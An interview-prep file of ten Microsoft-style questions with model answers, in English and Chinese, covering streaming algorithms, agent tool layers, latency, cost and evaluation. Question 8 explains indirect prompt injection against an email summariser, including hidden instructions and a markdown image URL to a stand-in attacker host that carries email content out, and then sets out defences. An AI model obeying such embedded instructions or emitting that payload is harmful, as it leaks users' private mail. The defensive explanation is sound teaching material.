# 23 · Microsoft

> 10 题。出处：`README.en.md` § Microsoft。答案为本仓库自行整理，`Source` 为原文延伸阅读。

---

### 1. Implement “top-k most frequent search queries” over a large query log, then tell me what breaks when the log becomes an unbounded stream across many machines.

**Anchor answer**

**Reference implementation** (bounded-memory heavy hitters, single pass):

```python
import heapq
from collections import defaultdict

def top_k(stream, k, capacity=None):
    """Space-Saving: O(capacity) memory, O(1) per item."""
    capacity = capacity or 10 * k          # typical: 10-20x k
    counts, errors = defaultdict(int), defaultdict(int)
    for q in stream:
        if q in counts:
            counts[q] += 1
        elif len(counts) < capacity:
            counts[q] = 1
        else:
            victim = min(counts, key=counts.get)   # real impl: min-heap on count
            c = counts.pop(victim)
            counts[q] = c + 1
            errors[q] = c                          # q is over-counted by <= c
    return heapq.nlargest(k, counts.items(), key=lambda kv: kv[1])
```

**Key points**

- *Exact top-k* needs a hash map over all distinct queries — memory grows with cardinality, so it dies on an unbounded stream. Space-Saving/Misra-Gries give an εN error bound with O(k/ε) counters; Count-Min Sketch is the alternative when you need per-item estimates rather than a candidate set.
- *Distributed merge*: each shard emits its local candidates, the coordinator **sums** counts, keeps the top k, then runs an exact second pass over those candidates. Space-Saving summaries are *not* exactly mergeable — merged error bounds are looser than a single-pass bound, so state the guarantee you actually have.
- **What breaks at scale**: (1) memory if anyone leaves a `defaultdict` in the path; (2) key skew — one hot query hammering one shard, fixed by local pre-aggregation before shuffle; (3) retries double-counting — dedupe on event id; (4) "top-k over what window" is an undefined requirement until you pick tumbling vs sliding; sliding windows need per-window sketches, not one global counter.

**中文要点**：精确 top-k 的内存随基数增长，流式必须换 Space-Saving/Count-Min 这类有 εN 误差界的近似结构；分布式靠"各分片出候选→合并→对候选精确回算"，真正的坑是倾斜、重试重复计数和窗口定义。

---

### 2. Low-level design: sketch the classes and interfaces for the tool-calling layer of an agent host, where tools can come from native code, an OpenAPI spec, or an MCP server.

**Source**: https://outcomeschool.com/blog/what-is-mcp-model-context-protocol · https://outcomeschool.com/blog/how-does-function-calling-work-in-llms

**Anchor answer**

The design rule: **one internal contract, three adapters, and the model never sees a provider's native shape.**

| Component | Responsibility |
| :--- | :--- |
| `ToolSpec` | normalized `{name, description, input_schema, risk_tier, idempotent}` — provider-agnostic |
| `ToolProvider` (interface) | `list_specs()`, `resolve(name)`, `invoke(name, args) -> ToolResult` |
| `NativeProvider` | reflection over annotated functions; type hints → JSON Schema |
| `OpenApiProvider` | one spec → N specs, `$ref` deref, dialect normalization to one JSON Schema draft |
| `McpProvider` | `tools/list` at init, cache with TTL, maps MCP `content[]` → `ToolResult` |
| `SchemaValidator` | validate args **before** dispatch; also validate the tool's output |
| `AuthzPolicy` | `(caller, tenant, tool, args)` → allow / deny / require-approval |
| `ToolExecutor` | timeout, retry-class policy, idempotency key, circuit breaker |
| `ErrorClassifier` | maps everything to `{retryable, code, user_message}` — the only error vocabulary the loop understands |

Design points worth saying out loud:

- **Name collisions are guaranteed** once you host third-party MCP servers. Namespace as `provider.tool` internally, and only compress to flat names when the visible set is small and collision-free.
- **Schema fidelity is the real work.** OpenAPI allows constructs JSON Schema tool-calling doesn't; you must either restrict or reject at registration, not at call time.
- **Registration is a trust boundary** — an MCP server can redefine a tool between list and call. Hash the spec, pin the version, re-validate on change.
- Native tools should not bypass `AuthzPolicy` just because they're in-process; that's how the one privileged function leaks into a prompt-injected loop.

**中文要点**：核心是"内部统一契约 + 三个适配器"，模型只看归一化后的 ToolSpec；真活在于 JSON Schema 方言收敛与名称空间化，注册环节本身是信任边界（MCP 工具可在 list 与 call 之间被换掉）。

---

### 3. A Copilot chat feature has a p95 budget of 3 seconds to first useful content. Where does the time go, and how do you cut it?

**Source**: https://www.youtube.com/watch?v=XD8DD4cEHu0 · https://outcomeschool.com/blog/prefill-vs-decode-llm-inference-optimization

**Anchor answer**

Decompose the budget before optimizing — "first *useful* content" is a product metric, not TTFT:

| Segment | Typical share at p95 | Lever |
| :--- | :--- | :--- |
| Auth + session + geo RTT | 100–250 ms | connection reuse, edge termination, same-region inference |
| Retrieval (ACL-trimmed search over mail/files/meetings) | 300–800 ms | parallel fan-out, pre-warm index, cap candidate count, pre-filter by ACL |
| Prompt assembly + tokenization of long context | 100–300 ms | already-cached system prompt, cap included snippets, dedupe |
| **Prefill** (compute-bound, ∝ prompt tokens) | 300–900 ms | prefix caching, shorter retrieved context, chunked prefill |
| Queueing / admission at p95 | 0–1000 ms, bimodal | reserved capacity, priority lane for interactive traffic, separate pool from batch |
| First token decode | 50–150 ms | speculative decoding, smaller draft model |
| Stream + client render | 100–300 ms | stream tokens, render incrementally, don't block on citations |

Two things that actually move p95 (not the mean):

1. **The tail is queueing, not compute.** At p95 your prompt is 3–5× the median, and a longer prompt also waits longer in the batch scheduler. Cap the retrieved context and you fix both prefill and scheduling at once.
2. **Prefix cache hit rate is the single biggest lever** for chat, because the system prompt + tool schemas are identical across turns. Invalidating it (by injecting a timestamp or reordering tools per turn) is a self-inflicted 300–600 ms tax.

Don't bother with exotic kernel work before you've measured: in most Copilot-shaped features the model is <40 % of p95, and retrieval plus scheduling is the other 60 %.

**中文要点**：先拆 3s 预算——p95 的瓶颈通常是"长上下文的 prefill + 排队"，不是算力本身；最大杠杆是前缀缓存命中率与截断检索上下文，其次才是投机解码这类 kernel 级优化。

---

### 4. Estimate the annual serving cost of adding an LLM summary feature for 100 million weekly active users, and how you'd cut it by 10x.

**Source**: https://www.youtube.com/watch?v=jV2sCj4lHYk · https://outcomeschool.com/blog/llm-inference-optimization

**Anchor answer**

Estimate top-down with stated assumptions (numbers below are *typical order-of-magnitude placeholders*, not measured facts — say so out loud, then let the interviewer correct them):

| Driver | Assumption | Value |
| :--- | :--- | :--- |
| WAU | given | 100 M |
| Summaries per user per day | engagement guess | 2 |
| Calls/day | 100 M × 2 | 200 M |
| Input tokens | thread chunk of 20 mails/docs | ~6,000 |
| Output tokens | 8 bullets | ~250 |
| Price | mid-tier model, blended | ~$2.5 / 1 M input, ~$10 / 1 M output |
| Daily cost | 200 M × (6k×2.5 + 250×10)/1e6 | ≈ $3.5 M |
| Annual | × 365 | **≈ $1.2 B** |

That number is why the question exists: at 1e8 scale, **token count is the product**.

10× levers, ordered by leverage per unit of risk:

1. **Input compaction (3–6×)**: summarize threads hierarchically offline; a summary-of-summaries is cheap to regenerate. Cap input at the last N messages plus a rolling digest.
2. **Cascade (2–4×)**: a router sends 70–85 % of threads to a small/cheap model; escalate only on length, ambiguity, or low judge confidence. Quality risk is concentrated in the escalated slice — monitor it separately.
3. **Cache (1.5–3×)**: identical thread + same prompt version → same output. Hit rates on "summarize this thread again" are surprisingly high.
4. **Self-host and quantize (2–5×)** at sustained utilization; below ~30 % GPU utilization, API is cheaper — the crossover is the whole argument.
5. **Batch/offline** overnight for anything not latency-bound.
6. **Cap output**: 250 → 120 tokens halves decode cost, which dominates at these input:output ratios only after compaction moves the ratio.

**中文要点**：1e8 规模下成本 = 调用数 × token 数 × 单价，先给可被挑战的假设表再算；10 倍主要靠输入压缩 + 小模型级联 + 缓存，只有利用率足够高时自建量化集群才划算。

---

### 5. Design a Copilot feature that answers questions over a user's work email, documents and meetings, without ever leaking content the user can't access.

**Anchor answer**

The invariant: **authorization is decided by the retrieval system, not by the model, and never repaired after generation.**

| Layer | Decision | Implementation |
| :--- | :--- | :--- |
| Identity | whose permissions apply | the *user's* OAuth token, on-behalf-of flow; never a service account with broad graph read |
| Index | what exists per chunk | every chunk carries `tenant_id`, `item_id`, `acl_hash`, `owner`, `shared_with[]`, `sensitivity_label` |
| Query | **pre-filter inside the search** | ACL predicate pushed into the vector/keyword query, not applied to post-hoc results — post-filtering gives you a top-k that is mostly forbidden, then silently degrades recall |
| Rank | permission-aware scoring | expired/revoked shares excluded at query time via a delta-synced ACL store |
| Assembly | re-check before prompt | second check with a fresh ACL read; a share can be revoked between query and prompt |
| Output | citations must be resolvable | every claim cites an item id; the client resolves it with the user's token, so a leak is visible, not silent |
| Abstain | no evidence → refuse | "I don't have access to that" is a *correct* answer; never let the model speculate over partial context |

Failure modes that get shipped:

- **Stale ACLs.** A user removed from a group yesterday still appears in the index. Fix: event-driven ACL invalidation plus a TTL sweep; measure "revoked-but-retrievable" as a hard SLO. Treat it as a security bug, not a freshness bug.
- **Group expansion.** "Everyone except…" groups and nested distribution lists are where ACL evaluation diverges between the index and the source system. Pick one evaluator and make the index use it.
- **Exfiltration through the answer.** Prompt injection inside a document instructs the model to embed another user's snippet. Defence is capability-level: the retriever can only return what passed the filter, and the summariser has no network/file-write tools.
- **Meeting transcripts inherit calendar ACLs**, not attendee lists — decide explicitly which.

Verification: a synthetic corpus of permission pairs (should-see / must-not-see) run as a regression suite on every index change, plus red-team prompts that ask for other people's content.

**中文要点**：权限由检索系统在**查询内部**判定（pre-filter 而非 post-filter），每个 chunk 带 ACL，生成后再校验、引用可回解；最危险的不是模型胡说，而是 ACL 过期和"生成式外泄"，要靠能力限制兜底。

---

### 6. Design an agent that can take actions in a spreadsheet (“insert a pivot table of Q3 sales by region”): orchestration, tools and failure handling.

**Anchor answer**

Goal: turn a natural-language intent into a **typed, validated, previewable, undoable** mutation of a live workbook.

**Orchestration** — a fixed pipeline beats a free-roaming agent here:

1. **Understand** — extract intent + slots (`op=insert_pivot`, `source=?, rows=region, values=sales, filter=Q3`).
2. **Ground** — resolve slots against the actual workbook: which sheet, which range, which header row, which column is "sales". This is deterministic code reading structure, *not* the model guessing cell addresses.
3. **Clarify** — if two sheets both look like Q3 sales, ask; do not pick.
4. **Plan** — emit a typed op list.
5. **Dry-run** — apply to a copy, compute the resulting range and any formula errors.
6. **Confirm** — show the diff/preview for anything that overwrites cells.
7. **Commit** — single transaction, snapshot before, return an undo handle.

**Tool surface** (keep it semantic, not `set_cell`):

| Tool | Notes |
| :--- | :--- |
| `describe_workbook()` | sheets, dimensions, named ranges, header candidates |
| `read_range(sheet, a1)` | capped rows, returns preview + row count |
| `insert_pivot(spec)` | declarative; the app builds it |
| `write_values(range, values)` | highest risk — always confirm |
| `snapshot()` / `revert(handle)` | cheap because spreadsheets are diffs |

**Failure handling**: (a) *silent misresolution* is the killer — "region" matched a column of office locations; mitigate by returning the resolved mapping to the user in the preview. (b) Partial application when pivot creation fails after the data write — wrap in one transaction or a compensating revert. (c) Recalculation timeouts and volatile functions (`NOW()`) make dry-run output differ from commit; snapshot-quarantine volatile cells. (d) Large sheets: never materialise a million rows into the prompt — read schema and aggregates only.

**中文要点**：用固定管线（理解→确定性 grounding→澄清→plan→dry-run→确认→事务提交）而不是自由 agent；工具是语义化的（insert_pivot 而非 set_cell），最大的失败是"region 被错误解析成办公室列"这类静默错配，所以预览必须回显解析结果。

---

### 7. How would you evaluate a meeting-summarisation feature before shipping it to a hundred million users?

**Source**: https://outcomeschool.com/blog/llm-evaluation

**Anchor answer**

Layer it, because no single metric survives at this scale:

| Layer | What it catches | Method |
| :--- | :--- | :--- |
| **Unit** | hallucinated decisions, wrong owners/dates | claim-level entailment: split summary into atomic claims, check each against the transcript (NLI or a judge with the transcript in context). Track **unsupported-claim rate**, not ROUGE |
| **Coverage** | missed decisions/action items | recall over an annotated must-mention set: decisions, action items + owner + due date, open questions |
| **Task-specific slots** | the actual product value | action-item precision/recall, owner correctness, date normalization correctness — these are checkable, unlike "fluency" |
| **Pairwise preference** | overall usefulness | LLM judge on paired outputs with position-swapping; calibrate judge against human labels and report agreement — an uncalibrated judge is a random number generator with confidence |
| **Human audit** | judge blind spots | stratified weekly sample, ~200 meetings across lengths/domains, double-annotated; track inter-annotator agreement as the ceiling |
| **Online** | real utility | canary by tenant, thumbs, "did the user open the recording", edit rate on action items, downstream task completion; guardrail metrics for latency and cost |

Two traps specific to summarization:

1. **Slices or nothing.** Aggregate scores hide that long, multi-speaker, accented, cross-lingual meetings fail. Pre-register slices (duration, speaker count, domain, locale) and gate per slice.
2. **Reference summaries are expensive and wrong.** Don't train on one human's summary as truth; evaluate against the *transcript*, which is the only ground truth.

Pre-launch gate: offline slices within tolerance, zero P0 unsupported-claim classes (e.g. invented legal commitments), judge–human agreement ≥ target, canary guardrails green.

**中文要点**：分层评估——claim 级蕴含查幻觉、槽位查行动项、pairwise 评审看可用性、人工抽审定上限、线上 canary 看真实效用；聚合分会掩盖长会议/多语种切片崩坏，必须预先切分并按片设闸门。

---

### 8. Your Copilot summarises incoming email. An attacker emails a target user with hidden instructions addressed to the model. Walk me through the attack and your defence.

**Source**: https://outcomeschool.com/blog/prompt-injection-in-llms

**Anchor answer**

**The attack (indirect prompt injection).** The attacker never touches the victim's session. They send mail with instructions embedded in the *data*: white-on-white text, 1 px font, HTML comments, `display:none` divs, alt-text, or a zero-width-character encoding. The summariser concatenates the email body into the prompt; the model cannot distinguish "content to summarise" from "instructions from my operator", so it obeys. Payload goals are usually one of:

| Goal | Mechanism |
| :--- | :--- |
| Exfiltration | "append `![](https://attacker/x?d=<previous email>)`" — the client auto-loads the image, data leaves in the URL |
| Action | "forward this thread to…" if the agent has send/move tools |
| Persistence | write the instruction into a memory/notes feature, poisoning later turns |

**Defence, in order of reliability:**

1. **Assume prompt-level defences are probabilistic.** Instruction hierarchy, "content between delimiters is data", and spotlighting all reduce success rate; none eliminates it. Say this explicitly — it's the answer.
2. **Strip the channel**: sanitize HTML to plain text before the model sees it, drop comments/hidden styles, disable remote image loading in the mail client (an old control that happens to kill the classic exfil path).
3. **Capability restriction** — the summariser has no tools that can send, fetch, or write outside the message. Exfiltration needs an egress; remove it.
4. **Egress filtering** on any generated markdown/HTML: no external image URLs, no links to non-allowlisted domains.
5. **Elevate to HITL** for any action the summariser proposes; show the raw snippet that motivated it.
6. **Detection and eval**: maintain an injection corpus (public datasets + your own) as a regression suite; log and alert on prompts containing imperative patterns and on outbound URL variance.

Residual risk: a summary can still be *wrong* on instruction ("ignore the payment request") without any tool. Accept it, and don't present summaries as authoritative for security-relevant mail.

**中文要点**：间接注入的本质是数据与指令不可分；prompt 层防御只能降概率，真控制面是"净化输入 + 摘掉一切出口能力（无发送/无外链图片）+ 副作用走 HITL + 注入语料回归集"。

---

### 9. A shipped Copilot feature that summarises job applicants for recruiters is accused of working worse for some groups. How do you establish whether that's true, and what do you do about it?

**Anchor answer**

First, **fix the unit of analysis**: the harm is not "the summary reads differently" — it is a downstream decision (shortlist, interview, reject). Measure the pipeline from summary to recruiter action, because that's what a regulator and an affected candidate care about.

**Establish whether it's true**

1. **Define the outcome variable** — e.g. rate of "strong match" recommendation, or rank position. Ambiguous target = unfalsifiable audit.
2. **Counterfactual swap test**: take identical résumés, change only name/pronouns/affinity-group signals, regenerate. Any systematic delta is direct disparate treatment. This is cheap and decisive.
3. **Stratified error metrics on real data**, conditioned on qualification proxies (years, skills match, degree): compare FPR/FNR of the "advance" decision and calibration per group. Equal accuracy with unequal *error types* is still harm.
4. **Confound control**: the base rate differs across groups in the applicant pool; use matched or reweighted comparisons, report CIs, and prefer within-role comparisons.
5. **Adjudicate the model's own evidence**: for sampled cases, check whether stated reasons reference proxies (names, gaps, schools, postal code, gendered language).

**What to do**

| Finding | Action |
| :--- | :--- |
| Direct effect via proxies | strip proxy features, add name/pronoun obfuscation in training and prompts |
| Rubric drift | constrain generation to job-related criteria with **verbatim evidence citations** per criterion; refuse to score unsupported criteria |
| Calibration gap | group-balanced fine-tuning / reweighting, then re-run the swap test |
| Residual | abstain on low-evidence cases, show raw résumé alongside, keep a human decision owner, and document the audit |

Also: jurisdiction matters. Some localities require independent bias audits of automated employment decision tools (NYC Local Law 144 is the well-known one), so "we measured it ourselves" may not satisfy the obligation.

**中文要点**：先纠正度量对象——危害落在"摘要→recruiter 决策"这条链上；用同简历换名字的反事实实验查直接差异，再按资历分层比 FPR/FNR 与校准；修法是去代理特征 + 强制逐条引用原文证据 + 分组平衡微调 + 低证据时弃答。

---

### 10. Tell me about a time a technical decision you championed turned out to be wrong. What happened, and what did you change afterward?

**Anchor answer**

Answer with a **decision, not a project**. The interviewer is testing whether you can name a wrong call precisely, own it without theatre, and show a changed *process*.

Structure that scores (illustrative shape, fill in your own facts):

| Beat | What to include | What to avoid |
| :--- | :--- | :--- |
| Situation | the constraint you were optimizing for at the time | "we had a lot of work" — no constraint named |
| The call | what you championed, and the **reasoning that made it reasonable then** | pretending it was obviously doomed |
| The signal | the specific metric/log/user report that contradicted you, and how long it took to notice | "it didn't work out" |
| Cost | who else paid for it — that's what makes the ownership real | blaming a team that "misused" it |
| Change | the *mechanism* you added: a spike gate, an eval harness, a reversibility requirement, a smaller rollout | "I learned to be more careful" |

A concrete shape that sounds like an engineer, not a template: *we chose a single heavyweight fine-tuned model for a classification + extraction pipeline because it maximized offline F1; nine months later the latency and cost tail made it unfit for the interactive surface, and per-task small models beat it. I had optimized a metric nobody had tied to the product.* The process change: **every design review now states its target metric and the operational budget it assumes, and an ADR must name the condition under which we'd reverse the decision.**

Two credibility markers: (1) say what you'd do differently *in the room*, (2) note what you kept from the original call — a fully reversed decision reads as poor judgment twice.

**中文要点**：讲一次"当时理由合理、后来被指标证伪"的技术决策；必须给出发现信号的具体指标、代价由谁承担、以及你事后加的**机制**（评审强制写目标指标与运营预算、ADR 写明推翻条件），而不是"我学会了更谨慎"。

---

## 附：这 10 题怎么用

| 筛什么 | 挑哪几题 |
| :--- | :--- |
| 流式/大规模数据处理功底 | 1（有界内存 top-k）、4（成本建模） |
| 平台抽象能力 | 2（工具层 LLD）、6（表格 agent 的工具面设计） |
| 权限与数据边界 | 5（ACL 感知检索）、8（间接注入） |
| 端到端产品判断 | 3（3 秒预算）、7（十亿级评估） |
| 责任 AI 是否真做过 | 9（分组差异取证） |
| 反思能力 | 10（错误决策） |
